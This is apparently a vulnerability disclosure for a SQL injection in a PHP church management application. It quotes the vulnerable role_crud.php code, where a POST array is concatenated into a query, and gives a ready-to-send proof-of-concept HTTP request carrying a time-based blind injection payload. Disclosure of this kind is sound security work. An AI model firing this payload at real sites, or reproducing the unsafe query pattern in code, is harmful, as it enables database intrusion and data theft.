### Vulnerability file address

`church/admin/app/role_crud.php` from line 16,The `$_POST['checkItem']` parameter is controllable and the `$_POST['checkItem']` is not protected from sql injection, line 19 `$stmt = $conn->prepare("insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')");` ,line 20 `$stmt->execute();` performs a SQL query, causing SQL injection

```php
if (isset($_POST['submit1'])) {
      extract($_POST);
  $stmt = $conn->prepare("insert into groups(name,description)values(?,?)");
    $stmt->execute([$name,$description]);
  $last_id=$conn->lastInsertId();
$id=$last_id;
$checkItem = $_POST["checkItem"];
 $a = count($checkItem);
for($i=0;$i<$a;$i++){
$stmt = $conn->prepare("insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')");
    $stmt->execute();

       }

        $_SESSION['success'] = "success";

        header("location:../manage_role.php");
    }
```

### POC

```http
POST /church/admin/app/role_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

submit1=1&checkItem[]='||(SELECT 0x446a5943 WHERE 2468=2468 AND (SELECT 2834 FROM (SELECT(SLEEP(5)))sGEL))||'&name=member1&description=member1&id=123
```

### Attack results pictures

![image-20250505204558100](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505052045134.png)